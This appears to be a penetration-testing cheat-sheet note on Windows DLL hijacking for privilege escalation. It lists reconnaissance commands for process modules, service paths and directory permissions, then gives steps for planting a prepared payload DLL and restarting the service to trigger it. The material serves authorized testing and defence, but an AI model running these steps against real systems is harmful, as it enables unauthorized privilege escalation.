---
technique: DLL Hijacking
category: privilege-escalation
targets: Windows Applications, Windows Services
protocols: Local
remote_capable: false
tags: windows privilege-escalation dll-hijacking service writable-path
---

# DLL Hijacking

DLL hijacking abuses writable search paths, missing DLLs, or side-loading behavior in privileged processes.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Writable search path | Operator must write where the target process searches |
| Triggerable process | Target process or service must load the DLL |
| Prepared DLL | Payload construction belongs in a tool or payload note |

## Windows

### Process modules

#powershell #dll #recon

List loaded modules for a process.

```powershell title:"List process modules"
Get-Process -Id "$pid" -Module
```
<!-- cheat
var pid
-->

### Service binary path

#cmd #service #dll

Show service binary path and account.

```cmd title:"Show service binary path"
sc qc "$service_name"
```
<!-- cheat
var service_name
-->

### Directory permissions

#cmd #filesystem #dll

Check permissions on a candidate DLL search directory.

```cmd title:"Check DLL directory permissions"
icacls "$directory_path"
```
<!-- cheat
var directory_path
-->

### Step 1: Place hijack DLL

#cmd #dll

Copy a prepared DLL into the writable search path with the expected name.

```cmd title:"Place DLL hijack payload"
copy "$payload_dll" "$target_dll_path"
```
<!-- cheat
var payload_dll
var target_dll_path
-->

### Step 2: Stop target service

#cmd #service

Stop the target service before starting it again to trigger DLL loading.

```cmd title:"Stop DLL hijack service"
sc stop "$service_name"
```
<!-- cheat
var service_name
-->

### Step 3: Start target service

#cmd #service

Start the target service to trigger DLL loading.

```cmd title:"Start DLL hijack service"
sc start "$service_name"
```
<!-- cheat
var service_name
-->

## Linux

No Linux operator command is included here. This note covers Windows DLL hijacking.
